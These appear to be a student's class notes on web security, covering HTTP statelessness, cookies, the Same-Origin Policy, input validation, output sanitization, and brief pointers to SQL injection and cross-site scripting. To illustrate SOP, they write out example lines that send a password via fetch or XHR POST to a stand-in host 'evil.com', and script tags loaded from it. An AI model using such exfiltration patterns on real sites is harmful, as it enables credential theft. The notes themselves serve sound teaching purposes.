https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Overview
https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Messages
https://en.wikipedia.org/wiki/Relational_database
https://en.wikipedia.org/wiki/SQL_syntax


**Stateless means HTTP has no memory between requests.**

Each HTTP request is treated as completely fresh and independent. The server doesn't remember anything about you from the previous request. So if you load page 1 and then page 2 on Wikipedia, the server handles request 2 with zero knowledge that request 1 ever happened.

A concrete example: imagine you log into Amazon. You click on a product. Then you add it to cart. Without cookies, the server would have no idea who you are on each of those clicks, every request looks like a stranger walking in.

**That's the "stateless but not sessionless" point**, HTTP itself forgets everything, but cookies patch over that by carrying state (like "this is user Tan, she's logged in") along with every request, so the server can _pretend_ it remembers you.


## Class notes 

### Web Security

We will focus on application, presentation and session part of OSI model. 

Application (Layer 7) eg. amazon.com 

### Assumptions
Site is trustworthy 
Third-party sites are trustworthy. 
DNS is trustworthy.
TLS and CAs are trustworthy.  It is possible TLS is broken but rare thing to see. 
Lower layers of the stack are trustworthy. 
Attackers cannot intercept traffic - TLS partially solves this. 
But there are a lot of technology like proxy end the TLS. so if proxy gets compromised it is a problem. 
**Sites cannot escape the browser sandbox.** 
#### Important 
Different origins are isolated. -> origin = **<scheme, host, port>** 
Every web object is associated with an origin. 
- **HTML, CSS, scripts, images, fonts...** 
eg. the jpeg file that you fetch. 

####  Same Origin Policy: 
**Scripts** from one origin cannot access data from another origin. 
Majorly it is **Javascript, javascript running your browser cannot access other javascripts.** 
Browser is enforcing this policy. **If the browser has a bug it has lost the game.** 

![[Pasted image 20260530134009.png]]

A script running on `bank.com` is trying to secretly send your password to `evil.com`:

1. Creates an HTTP request (`XMLHttpRequest`)
2. Packages up your password into form data
3. POSTs it to `evil.com`

**Why SOP blocks it:**

The **Same-Origin Policy** says: a script can only send/read data to/from the **same origin** it came from. Origin = **protocol + domain + port.**

The script is from `bank.com` but is trying to talk to `evil.com` — that's a **different origin**, so the browser just refuses to send it.
![[Pasted image 20260530134026.png]]

Is allowed because you're just **_embedding_ a resource**, not _reading data back from it_. SOP only kicks in when a script tries to **read or send sensitive data** across origins.

As long as it is the html tag it is allowed. 
< img src="https://evil.com/pic.png">       ✅
< script src="https://evil.com/code.js">    ✅
< link href="https://evil.com/style.css">   ✅

**<script src - "> </script> - a third party code sourcing is allowed though it can be leverage malicious. This is a gap we will be addressing in two weeks.** 
If you apply CSP you do it better - two weeks. 

Blocked (JavaScript trying to read/send data):
xhr.open("POST", "https://evil.com", true)  ❌
fetch("https://evil.com/steal")             ❌

eg. if you are accessing Bank of America you cant access Minecraft javascript. 
- Basics of classic web security

Adjustments possible , login to github using your google account. 

#### Hypertext transfer Protocol (HTTP)

![[Pasted image 20260530135042.png]]

**Stateless** means each HTTP request is completely independent — the server has no memory of previous requests. Every request starts fresh.
HTTP H2,H3 are binary and compressed in multiple ways which dont make any sense. 
Body does not have structures. 

Status code 
**200 family is success** 
**300 is redirection** 
**400 is client error.** 
**500 is not you it is  the server.** 
400 and 500 is useful for class

HTTP is transactional you send one request and send response, batching does not work. 

HTTP is not  stateful like  TCP, but application is stateful like when you login amazon.com 
State is not http job but the backend's job. 

How HTTP "fakes" state:
- **Cookies** — server sends a cookie, browser sends it back on every request. Cookie is one key value pair. 
- **Sessions** — server stores session data, gives you a session ID (usually via a cookie)
- **URL parameters** — state passed in the URL like `?user=tan`
- **LocalStorage/SessionStorage** — browser-side storage JS can read

#### HTTP Request 
![[Pasted image 20260530135819.png]]

#### HTTP Methods 


If you set **httponly = true that means cookie cannot be sent through document.cookie() or javascript** 
**some times javascript might need the cookie.** 
but if not do set this value. 

You login to amazon.com it returns back success page. 

Read set-cookie and cookie. 

Access control is built on top of HTTP. 

For this course we assume TLS is always there. 
TLS does nothing is you go to a malicious site. 
If the website has vulnerability TLS does nothing. 

Basis of web attack is seperation of data and control. 

#### Javascript

eval()

OWASP fact check 

#### Root of most evil 

Untrusted input. 
everything in a HTTP, request is considered input. 
- path 
- Query string 
- Header names, header values
- POST parameters 
- Hidden form fields 
- Cookies 
- Uploaded files 

Everything that comes to the application from external- not just request paylod. but every part of the request. 


### Rule 1: Validate Input 

Validate all input always. 
eg. data type, range.charachters/patters, allowed, whether duplicates or empty values are allowed. 
Against a positive specification. eg does it contain bad characters - you can;t know that you know the good charactehers. 
eg. regular expression match if is it the date. 
e.g get_ip get the network interface and check if is right instead they 
Do it on the server. 
- client-side checks are trivial to bypass. 
Do it as early as possible.
if the validation fails, drop the input, don't process it. 

### Rule 2: Sanitize the output 

Output data depends on the output  medium, if there anything in my output that has special meaning , e.g {} in html siginifies text you should not directly copy paste. 
{} - in SQL means something else 

It could becorrectly stripping, encoding them, escape them - but this also depeneds on the output medium. This requires domain knowledge. 
You generally do these through library. 
 <script;> </..> - this could be a firewall bypass 
Input cannot be sanitized, validate input and sanitize output. 
	Never say input sanitization. 
### How do i know what is the input and what is the output. 
Web server receives input and sends to database
- if you are the developer of website it is their input 
  if it is database input it is their output. 

## SQL 

UNION SELECT 

SQL queries often include ***user input***

-- comment it out. 

Be aware of the tiny implementation details. 

'  and paranthesis is what you should look into it. 

metadata table 

Application level issue like FLask can 

Cross site scripting:  Javascript injection you inject JS code so that the browser will think it has come from the application. 

end goal is your injected script should be in the code. reflect back to you! 

look for some input injection need not be vulnerability always. 














- 



